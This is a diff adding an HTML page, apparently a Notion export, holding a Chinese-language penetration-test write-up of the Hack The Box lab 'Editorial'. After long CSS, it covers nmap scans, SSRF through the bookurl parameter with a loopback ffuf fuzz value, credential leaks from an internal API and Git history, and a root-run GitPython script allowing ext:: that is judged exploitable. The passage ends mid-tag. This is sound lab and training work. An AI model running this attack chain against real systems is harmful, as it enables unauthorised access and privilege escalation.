@@ -1,0 +1,848 @@
+<!doctype html><html lang="zh-Hant"><head><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Editorial | Web &amp; Linux Penetration Testing Report</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+	/* Paint a complete callout box on every PDF page fragment. */
+	-webkit-box-decoration-break: clone;
+	box-decoration-break: clone;
+}
+
+/* For default-background callouts, render the border outline. */
+.callout.block-color-default_background {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+/*
+ * Toggles and callouts hold arbitrary content, so they can easily be taller
+ * than a page. They must stay breakable: avoiding breaks inside them makes
+ * Chromium push the whole block onto the next page, which leaves the previous
+ * page mostly empty before every long toggle.
+ */
+details,
+aside {
+	margin: 1.25em 0;
+}
+
+/* Keep a toggle's title on the same page as the start of its content. */
+summary {
+	page-break-after: avoid;
+	break-after: avoid;
+}
+
+/*
+ * Toggle headings render as <h1/h2/h3 style="display:inline-block"> inside
+ * <summary>. Without this reset, the heading's margin-top pushes it below the
+ * ::marker (▼), so the triangle and the title appear on separate lines.
+ */
+summary h1,
+summary h2,
+summary h3,
+summary h4 {
+	margin-top: 0;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding-inline: 0.125rem;
+	padding-block: 0.375rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+/*
+ * Render emoji icons using a ::before pseudo-element to keep the glyph
+ * out of the DOM textContent traversal. This avoids double-rendering icons
+ * in callouts and page titles.
+ * NOTE(slim/html-export-pseudo-icons): I can't tagref this because it will
+ * flag as a duplicate tag after codegen.
+ */
+.icon[data-emoji]::before {
+	content: attr(data-emoji);
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	margin-right: 0.4em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.tab {
+	margin: 1.25em 0;
+	padding-inline: 1rem;
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style><style>html{background:#101411;scroll-behavior:smooth}body{background:#101411;color:#e6eddf!important;font-family:Arial,sans-serif;white-space:normal;max-width:960px!important;margin:0 auto!important;padding:28px 28px 70px;line-height:1.85}h1,h2,h3{color:#edf3e8!important;letter-spacing:-.5px}h1{font-size:clamp(26px,4vw,40px)!important;overflow-wrap:anywhere}h2{margin-top:50px!important;padding-top:24px;border-top:1px solid #344035}a{color:#c4f58a!important}p,li{overflow-wrap:anywhere}.code,pre{background:#1a221c!important;color:#e5efdf!important;border:1px solid #344035;padding:18px!important;overflow:auto;max-width:100%;font-size:12px!important}code{color:inherit!important;white-space:pre-wrap!important;overflow-wrap:anywhere}figure.image{margin:24px 0}img{width:auto;max-width:100%;height:auto;border:1px solid #344035;border-radius:5px}.simple-table{display:block;max-width:100%;overflow:auto;font-size:13px}.simple-table th,.simple-table td{border-color:#455140!important;padding:12px!important}.simple-table th{background:#253021!important;color:#d9e9cd!important}.report-nav{display:flex;justify-content:space-between;gap:20px;font-size:12px;border-bottom:1px solid #344035;padding-bottom:20px;margin-bottom:38px}.attack-path{padding:22px 22px 22px 46px;background:#1b261b;border:1px solid #3e5234;border-radius:5px}.attack-path li{padding:8px 0}mark{color:inherit!important;background:transparent!important}@media(max-width:600px){body{padding:20px 18px 45px}.report-nav{flex-direction:column;gap:7px}.code,pre{padding:12px!important}.simple-table{font-size:11px}}@media print{html,body{background:white!important;color:#111!important}h1,h2,h3,a{color:#111!important}.report-nav{display:none}.code,pre,.attack-path{background:#f5f5f5!important;color:#111!important}}</style></head><body><nav class="report-nav" aria-label="報告導覽"><a href="../index.html#labs">← 返回 Jeff | Security Portfolio</a><span>HACK THE BOX · WEB &amp; LINUX LAB REPORT</span></nav><article id="403b121d-98b1-8179-801d-e698d158f1d2" class="page sans"><header><h1 class="page-title" dir="auto">Editorial | Web &amp; Linux Penetration Testing Report</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><p id="572d103d-438f-4e9b-9045-a42d47d3afb7" class="" dir="auto">作者：Jeff<br/>平台：Hack The Box<br/>目標：Editorial，10.129.22.118<br/>網站：editorial.htb<br/>系統辨識：Ubuntu Linux，依 SSH 與 HTTP 服務指紋判讀<br/>測試性質：平台實驗靶機練習<br/>成果狀態：已成功驗證 SSRF、內部 API 資訊外洩、dev 與 prod 帳號存取，並完成 GitPython 高權限腳本的安全性分析與利用測試。最終 Root 權限未取得足夠證據確認。</p><h2 id="0c42ca51-e08e-4df6-b61f-5e42ecb09bbc" class="" dir="auto">01 Executive Summary 執行摘要</h2><p id="160dd6de-9773-4402-a16b-6e90e226a121" class="" dir="auto">本次針對 Editorial 實驗靶機進行滲透測試，分析外部 Web 功能如何串連至本機帳號存取與高權限執行風險。主要問題為封面預覽功能接受伺服器本機 URL、內部 API 與 Git 歷史包含有效憑證，以及 root 執行的複製儲存庫腳本接受不受信任的 URL。</p><p id="0844755b-633a-40f5-8d90-3d78bf2d093d" class="" dir="auto">測試者從 /upload-cover 的 bookurl 參數切入，枚舉伺服器 loopback 連接埠，辨識 127.0.0.1:5000 的內部 API。後端將回應存入 static/uploads，測試者讀取該檔案後取得 API 路徑與 dev 憑證，成功以 SSH 登入。</p><p id="749b3891-4aeb-4404-9cc3-cf3d16d78e64" class="" dir="auto">登入後，在 dev 家目錄的 apps/.git 中檢查歷史提交，取得先前寫入程式碼的 prod 密碼並成功登入 prod。sudo -l 顯示 prod 獲准以 root 執行 <code>clone_prod_change.py</code>，腳本將第一個參數傳入 GitPython，並明確允許 Git ext 協定。此設定形成高權限命令執行的危險條件。</p><p id="00d0dcc9-25de-4b7a-b13a-9fa9ff562fc1" class="" dir="auto">原始筆記保留了 ext:: 利用嘗試與 /tmp/rootbash -p 指令，但未附 SUID 檔案權限或 root 身分輸出。報告將其列為提權嘗試，不將 Git clone 的錯誤或單獨一行指令當作 root 成功證據。</p><h2 id="41a0b746-9d05-4b6d-878c-edcba2300ed7" class="" dir="auto">02 Scope &amp; Methodology 測試範圍與方法</h2><p id="3a3725b0-245c-4b3b-b294-b71e4001e098" class="" dir="auto">範圍限定於 10.129.22.118、editorial.htb，以及透過目標應用接觸到的本機服務。起始條件為沒有系統憑證。流程為服務辨識、封面 URL 請求分析、SSRF 驗證、內部 API 資料讀取、SSH 登入、Git 歷史檢查與 sudo 腳本分析。</p><table id="09caf663-76e5-466f-a42f-b7f2a710603b" class="simple-table" dir="ltr"><thead class="simple-table-header"><tr id="85c9bfbf-8d81-4212-bf59-75b1d8087021" dir="ltr"><th id="KXDg" class="simple-table-header-color simple-table-header">工具</th><th id="ZLTt" class="simple-table-header-color simple-table-header">目的</th></tr></thead><tbody><tr id="c1c280b3-b6d3-4abc-a909-99b2e4dbb5a2" dir="ltr"><td id="KXDg" class="">Nmap</td><td id="ZLTt" class="">連接埠與服務指紋辨識</td></tr><tr id="762cc047-3b37-4b4b-8ceb-1f496296c4b8" dir="ltr"><td id="KXDg" class="">Burp Suite</td><td id="ZLTt" class="">檢查 /upload-cover 請求、修改 bookurl</td></tr><tr id="9b32bd94-fbd4-4c84-b481-14ef7a3f691b" dir="ltr"><td id="KXDg" class="">ffuf</td><td id="ZLTt" class="">依回應差異枚舉 loopback 連接埠</td></tr><tr id="62379ba6-15a1-4ce4-a79f-756191ef2585" dir="ltr"><td id="KXDg" class="">curl、jq</td><td id="ZLTt" class="">讀取後端保存的 API 回應並解析 JSON</td></tr><tr id="65631d51-7f29-4df5-8988-c3234fedc1c5" dir="ltr"><td id="KXDg" class="">SSH、id、whoami</td><td id="ZLTt" class="">驗證取得的帳號與登入身分</td></tr><tr id="c03545c7-257e-475b-a112-7b1b2ddc2123" dir="ltr"><td id="KXDg" class="">Git</td><td id="ZLTt" class="">檢查提交歷史與含憑證的差異</td></tr><tr id="8960f05c-1371-44f1-9b52-6bec6d8d790a" dir="ltr"><td id="KXDg" class="">sudo、Python</td><td id="ZLTt" class="">檢查高權限腳本與 GitPython 設定</td></tr></tbody></table><p id="fed063d2-5256-4e43-908e-516525711e4a" class="" dir="auto">本報告依測試期間保留的操作紀錄整理，未重新執行測試。所有風險與驗證成果均依現有證據判讀，未確認的結果不列為成功利用。密碼以 <code>[REDACTED]</code> 代替。</p><h2 id="435fa7c4-b91e-4529-8037-7504ac295b17" class="" dir="auto">03 Attack Path Overview 攻擊路徑總覽</h2><ol class="attack-path"><li>封面預覽功能的 bookurl 觸發 SSRF</li><li>讀取 127.0.0.1:5000 內部 API</li><li>取得 dev 憑證，SSH 登入成功</li><li>從 Git 歷史取得 prod 憑證，SSH 登入成功</li><li>檢查 sudo 授權與 root 執行的 clone 腳本</li><li>分析 GitPython ext 協定並進行利用測試</li></ol><p id="f3111a24-9412-4c26-8544-0bb3cc422112" class="" dir="auto">F-01 讓外部請求接觸本機服務，F-02 提供初始系統帳號，F-03 擴展至具有 sudo 授權的 prod。F-04 呈現高權限腳本的利用測試。最終 Root 權限未取得足夠證據確認，未列為攻擊成果。</p><h2 id="130d69c9-490f-4c97-8b1a-74ae686f8f60" class="" dir="auto">04 Enumeration 資訊蒐集與分析</h2><h3 id="c33eea8a-3787-4003-94f1-6f2ea02818a9" class="" dir="auto">4.1 服務辨識</h3><pre id="4715019f-fa25-415b-8026-110bee05680e" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">nmap -p- --min-rate 1000 10.129.22.118
+nmap -sCV -p 22,80 10.129.22.118</code></pre><p id="76e39825-6dc9-43a4-849d-7e49f8e28955" class="" dir="auto">輸出顯示 22/tcp 為 OpenSSH 8.9p1 Ubuntu，80/tcp 為 nginx 1.18.0，HTTP 導向 editorial.htb。223/tcp 標為 filtered，不能列為已確認開放服務。</p><p id="ea88d40a-39fb-48fd-a5c3-fdfdd8336bec" class="" dir="auto">網站提供投稿與封面預覽，封面來源包含 URL 欄位與檔案欄位。測試者選擇 URL 欄位檢查伺服器端請求行為，未將檔案上傳功能直接認定為任意程式執行。</p><figure id="e29389a4-c127-49a4-89ac-fd1033ee8fe5" class="image" data-notion-image="assets/editorial-cover-preview.png" dir="ltr"><a href="assets/editorial-cover-preview.png"><img loading="lazy" alt="Editorial 封面 URL 欄位與 Preview 預覽介面" src="assets/editorial-cover-preview.png"/></a></figure><p id="b7dfe5e1-07e0-45b2-96d3-dc910a727274" class="" dir="auto">圖 4-1：原始封面 URL 與 Preview 介面。</p><h3 id="72a85f78-3632-41e7-bdcb-e371a22fdcb1" class="" dir="auto">4.2 回應差異與內部服務辨識</h3><p id="95ed56ff-1d6e-4bee-9386-81cdec13b26c" class="" dir="auto">Burp 截圖中，bookurl 分別指向 127.0.0.1:80 與無效連接埠，兩者均回傳預設圖片路徑，回應時間不同。時間差提供調查方向，單靠時間差不足以確認 SSRF。</p><figure id="294d1a3d-d19c-4d5a-aaad-12f8786f94c0" class="image" data-notion-image="assets/editorial-burp-request.png" dir="ltr"><a href="assets/editorial-burp-request.png"><img loading="lazy" alt="Burp 對 bookurl 提交 loopback URL，回應為預設圖片路徑" src="assets/editorial-burp-request.png"/></a></figure><p id="4391f995-90ea-4c76-966c-e1acc7977487" class="" dir="auto">圖 4-2：指向 127.0.0.1:80 的請求與預設圖片回應。此圖呈現測試位置，成功讀取內部內容的證據見第五章文字紀錄。</p><p id="50344004-b545-47d0-ae7c-650bc2a83fee" class="" dir="auto">測試者將原始 multipart 請求中的 bookurl 改為 <code>http://127.0.0.1:FUZZ</code>，以 ffuf 枚舉 1 至 10000。request.txt 為原始 HTTP 請求檔案，不是直接掃描攻擊機本身的 loopback。</p><pre 